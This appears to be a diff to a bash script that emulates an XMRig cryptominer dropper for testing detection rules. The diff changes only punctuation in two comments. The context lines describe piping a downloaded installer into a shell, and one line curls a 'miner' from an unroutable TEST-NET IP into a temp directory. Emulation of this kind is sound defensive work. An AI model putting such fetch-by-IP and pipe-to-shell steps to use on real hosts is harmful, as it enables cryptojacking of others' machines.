@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# xmrig.sh — benign emulation of a XMRig / cryptominer dropper for detection-rule testing.
+# xmrig.sh - benign emulation of a XMRig / cryptominer dropper for detection-rule testing.
 #
 # What a miner dropper does on a victim: curl a miner binary down from a bare IP into a scratch
 # dir, then curl an installer and pipe it straight into a shell. This does the harmless analogue:
@@ -14,7 +14,7 @@ work=$(mktemp -d) || exit 0
 trap 'rm -rf "$work" 2>/dev/null' EXIT
 
 # 192.0.2.0/24 is TEST-NET-1 (RFC 5737): guaranteed unroutable. The point is the audit event, not
-# any transfer — every curl below fails fast and leaves nothing behind.
+# any transfer - every curl below fails fast and leaves nothing behind.
 
 # --- TTP: fetch the "miner" by IP literal into a scratch dir -> download_ip_to_tmp ---
 curl -s --max-time 2 "http://192.0.2.10/xmrig" -o "$work/xmrig" >/dev/null 2>&1 || true
